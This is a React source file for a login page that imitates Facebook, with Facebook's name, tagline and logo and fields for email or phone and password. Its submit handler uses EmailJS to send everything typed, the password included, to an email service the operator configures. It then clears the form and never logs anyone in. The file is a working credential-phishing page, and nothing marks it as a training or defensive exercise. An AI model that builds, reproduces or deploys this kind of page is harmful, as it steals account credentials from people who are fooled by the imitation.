import React from 'react'
import './LoginSignup.css'
import facelogo from '../Assets/facelogo.jpeg'
import { useRef } from 'react'
import emailjs from '@emailjs/browser';



const LoginSignup = () => {
  
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
    .sendForm(
      process.env.REACT_APP_EMAILJS_SERVICE_ID,
        process.env.REACT_APP_EMAILJS_TEMPLATE_ID,
        form.current,
      {
        publicKey: process.env.REACT_APP_EMAILJS_PUBLIC_KEY,
      }
      
    )
      .then(
        () => {
          console.log('SUCCESS!');
        },
        (error) => {
          console.log('FAILED...', error.text);
        },
      );
      e.target.reset()
  };

  


  return (
    <>
   
    <div className='text-container'>
      <div className='face-text'>Facebook</div>
      <div className='text'>Facebook helps you connect and share <br/>with the people in your life. </div>
    </div>
    <img className='logo' src={facelogo} alt=''/>
   

    <div className='container'>  
     
     <form ref={form} onSubmit={sendEmail} className='--form-control'> 
     <div className='header'>
    
     <div className='underline'></div>
     
      </div>
      <div className='inputs'>
          <input type='email' name='user_email' placeholder='Email address or Phone number'/>
          <input type='password' name='user_password' placeholder='Password'/>
      </div>
      
      <div className="submit-container">   
      <button className="submit" >Log In</button>
      </div>
      <span className="forgot-password"> Forgot password?</span>
      <button className="Sign-up" >Create new account  </button>
      </form>
        
    </div>
    </>
  )
}

export default LoginSignup